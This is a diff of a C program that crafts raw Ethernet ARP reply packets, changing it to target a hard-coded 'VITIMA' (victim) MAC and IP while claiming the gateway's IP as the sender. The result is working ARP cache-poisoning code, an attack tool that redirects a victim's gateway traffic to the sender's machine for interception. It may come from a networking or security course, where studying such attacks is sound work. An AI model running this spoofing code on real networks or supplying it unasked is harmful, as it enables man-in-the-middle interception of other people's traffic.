@@ -17,12 +17,12 @@
 #include <net/if.h>
 #include <netinet/ether.h>
 
-#define MY_DEST_MAC0 0xff //0x4c
-#define MY_DEST_MAC1 0xff //0xed
-#define MY_DEST_MAC2 0xff //0xde
-#define MY_DEST_MAC3 0xff //0x9f
-#define MY_DEST_MAC4 0xff //0xa2
-#define MY_DEST_MAC5 0xff //0xcd
+#define VITIMA_MAC0 0x40 //0xff //0x4c
+#define VITIMA_MAC1 0xf0 //0xff //0xed
+#define VITIMA_MAC2 0x2f //0xff //0xde
+#define VITIMA_MAC3 0x7f //0xff //0x9f
+#define VITIMA_MAC4 0x55 //0xff //0xa2
+#define VITIMA_MAC5 0xbf //0xff //0xcd
 
 //ROUTER <--> sendRawEth.c <--> DEST
 #define GATEWAY_IP0 192
@@ -57,7 +57,8 @@ union arp_packet_u {
         uint8_t raw_data[sizeof(struct arp_packet)];
 };
 
-void fill_arp(struct arp_packet *pkt, const uint8_t *mac, const uint8_t *ip_dest, int operation) {
+void fill_arp(struct arp_packet *pkt, int operation, const uint8_t *sender_mac,
+              const uint8_t *sender_ip, const uint8_t *target_mac, const uint8_t *target_ip) {
   /* Fill ARP header */
 	pkt->hw_type = htons(ARPHRD_ETHER);    //hardware type = Ethernet
 	pkt->prot_type = htons(ETH_P_IP);      //protocol type = IPv4
@@ -65,29 +66,29 @@ void fill_arp(struct arp_packet *pkt, const uint8_t *mac, const uint8_t *ip_dest
 	pkt->dlen = 4;                         //IPv4 addresses are 4 octets
 	pkt->operation = htons(operation);             //1 for REQUEST, 2 for REPLY
 
-	pkt->sender_hwaddr[0] = mac[0];
-	pkt->sender_hwaddr[1] = mac[1];
-	pkt->sender_hwaddr[2] = mac[2];
-	pkt->sender_hwaddr[3] = mac[3];
-	pkt->sender_hwaddr[4] = mac[4];
-	pkt->sender_hwaddr[5] = mac[5];
+	pkt->sender_hwaddr[0] = sender_mac[0];
+	pkt->sender_hwaddr[1] = sender_mac[1];
+	pkt->sender_hwaddr[2] = sender_mac[2];
+	pkt->sender_hwaddr[3] = sender_mac[3];
+	pkt->sender_hwaddr[4] = sender_mac[4];
+	pkt->sender_hwaddr[5] = sender_mac[5];
 
-	pkt->sender_ip[0] = GATEWAY_IP0; //ip_dest[0];
-	pkt->sender_ip[1] = GATEWAY_IP1; //ip_dest[1];
-	pkt->sender_ip[2] = GATEWAY_IP2;   //ip_dest[2];
-	pkt->sender_ip[3] = GATEWAY_IP3;   //ip_dest[3];
+	pkt->sender_ip[0] = sender_ip[0];
+	pkt->sender_ip[1] = sender_ip[1];
+	pkt->sender_ip[2] = sender_ip[2];
+	pkt->sender_ip[3] = sender_ip[3];
 
-	pkt->target_hwaddr[0] = MY_DEST_MAC0;
-	pkt->target_hwaddr[1] = MY_DEST_MAC1;
-	pkt->target_hwaddr[2] = MY_DEST_MAC2;
-	pkt->target_hwaddr[3] = MY_DEST_MAC3;
-	pkt->target_hwaddr[4] = MY_DEST_MAC4;
-	pkt->target_hwaddr[5] = MY_DEST_MAC5;
+	pkt->target_hwaddr[0] = target_mac[0];
+	pkt->target_hwaddr[1] = target_mac[1];
+	pkt->target_hwaddr[2] = target_mac[2];
+	pkt->target_hwaddr[3] = target_mac[3];
+	pkt->target_hwaddr[4] = target_mac[4];
+	pkt->target_hwaddr[5] = target_mac[5];
 
-	pkt->target_ip[0] = ip_dest[0];
-	pkt->target_ip[1] = ip_dest[1];
-	pkt->target_ip[2] = ip_dest[2];
-	pkt->target_ip[3] = ip_dest[3];
+	pkt->target_ip[0] = target_ip[0];
+	pkt->target_ip[1] = target_ip[1];
+	pkt->target_ip[2] = target_ip[2];
+	pkt->target_ip[3] = target_ip[3];
 
   return;
 }
@@ -129,12 +130,12 @@ int main(int argc, char *argv[])
 	uint8_t sendbuf[BUF_SIZ];
 	struct ether_header *eh = (struct ether_header *) sendbuf;
 	struct iphdr *iph = (struct iphdr *) (sendbuf + sizeof(struct ether_header));
-  //struct arp_packet *arp_payload = (struct arp_packet *) (sendbuf + sizeof(struct ether_header) + sizeof(struct iphdr));
   struct arp_packet *arp_payload = (struct arp_packet *) (sendbuf + sizeof(struct ether_header));
 	struct sockaddr_ll socket_address;
 	char ifName[IFNAMSIZ];
-  //uint8_t ip_dest[4] = {GATEWAY_IP0,GATEWAY_IP1,GATEWAY_IP2,GATEWAY_IP3};
-  uint8_t ip_dest[4] = {VITIMA_IP0,VITIMA_IP1,VITIMA_IP2,VITIMA_IP3};
+  uint8_t sender_ip[4]  = {GATEWAY_IP0,GATEWAY_IP1,GATEWAY_IP2,GATEWAY_IP3};
+  uint8_t target_ip[4]  = {VITIMA_IP0, VITIMA_IP1, VITIMA_IP2, VITIMA_IP3};
+  uint8_t target_mac[6] = {VITIMA_MAC0,VITIMA_MAC1,VITIMA_MAC2,VITIMA_MAC3,VITIMA_MAC4,VITIMA_MAC5};
 
 	/* Get interface name */
 	if (argc > 1)
@@ -167,47 +168,17 @@ int main(int argc, char *argv[])
 	eh->ether_shost[3] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
 	eh->ether_shost[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
 	eh->ether_shost[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];
-	eh->ether_dhost[0] = MY_DEST_MAC0;
-	eh->ether_dhost[1] = MY_DEST_MAC1;
-	eh->ether_dhost[2] = MY_DEST_MAC2;
-	eh->ether_dhost[3] = MY_DEST_MAC3;
-	eh->ether_dhost[4] = MY_DEST_MAC4;
-	eh->ether_dhost[5] = MY_DEST_MAC5;
+	eh->ether_dhost[0] = VITIMA_MAC0;
+	eh->ether_dhost[1] = VITIMA_MAC1;
+	eh->ether_dhost[2] = VITIMA_MAC2;
+	eh->ether_dhost[3] = VITIMA_MAC3;
+	eh->ether_dhost[4] = VITIMA_MAC4;
+	eh->ether_dhost[5] = VITIMA_MAC5;
 	/* Ethertype field */
   eh->ether_type = htons(ETH_P_ARP);
 	tx_len += sizeof(struct ether_header);
 
-  //fill_arp(arp_payload,((uint8_t *)&if_mac.ifr_hwaddr.sa_data),ip_dest,2);
-  arp_payload->hw_type = htons(ARPHRD_ETHER);    //hardware type = Ethernet
-	arp_payload->prot_type = htons(ETH_P_IP);      //protocol type = IPv4
-	arp_payload->hlen = ETH_ALEN;                  //Ethernet addresses are 8 octets
-	arp_payload->dlen = 4;                         //IPv4 addresses are 4 octets
-	arp_payload->operation = htons(2);             //1 for REQUEST, 2 for REPLY
-
-	arp_payload->sender_hwaddr[0] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[0];
-	arp_payload->sender_hwaddr[1] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[1];
-	arp_payload->sender_hwaddr[2] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[2];
-	arp_payload->sender_hwaddr[3] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
-	arp_payload->sender_hwaddr[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
-	arp_payload->sender_hwaddr[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];
-
-	arp_payload->sender_ip[0] = GATEWAY_IP0;
-	arp_payload->sender_ip[1] = GATEWAY_IP1;
-	arp_payload->sender_ip[2] = GATEWAY_IP2;
-	arp_payload->sender_ip[3] = GATEWAY_IP3;
-
-	arp_payload->target_hwaddr[0] = MY_DEST_MAC0;
-	arp_payload->target_hwaddr[1] = MY_DEST_MAC1;
-	arp_payload->target_hwaddr[2] = MY_DEST_MAC2;
-	arp_payload->target_hwaddr[3] = MY_DEST_MAC3;
-	arp_payload->target_hwaddr[4] = MY_DEST_MAC4;
-	arp_payload->target_hwaddr[5] = MY_DEST_MAC5;
-
-	arp_payload->target_ip[0] = VITIMA_IP0;
-	arp_payload->target_ip[1] = VITIMA_IP1;
-	arp_payload->target_ip[2] = VITIMA_IP2;
-	arp_payload->target_ip[3] = VITIMA_IP3;
-
+  fill_arp(arp_payload,2,((uint8_t *)&if_mac.ifr_hwaddr.sa_data),sender_ip,target_mac,target_ip);
   tx_len += sizeof(struct arp_packet);
 
   /* Index of the network device */
@@ -215,12 +186,12 @@ int main(int argc, char *argv[])
 	/* Address length*/
 	socket_address.sll_halen = ETH_ALEN;
 	/* Destination MAC */
-	socket_address.sll_addr[0] = MY_DEST_MAC0;
-	socket_address.sll_addr[1] = MY_DEST_MAC1;
-	socket_address.sll_addr[2] = MY_DEST_MAC2;
-	socket_address.sll_addr[3] = MY_DEST_MAC3;
-	socket_address.sll_addr[4] = MY_DEST_MAC4;
-	socket_address.sll_addr[5] = MY_DEST_MAC5;
+	socket_address.sll_addr[0] = VITIMA_MAC0;
+	socket_address.sll_addr[1] = VITIMA_MAC1;
+	socket_address.sll_addr[2] = VITIMA_MAC2;
+	socket_address.sll_addr[3] = VITIMA_MAC3;
+	socket_address.sll_addr[4] = VITIMA_MAC4;
+	socket_address.sll_addr[5] = VITIMA_MAC5;
 
   print_arp(arp_payload);
 	/* Send packet */
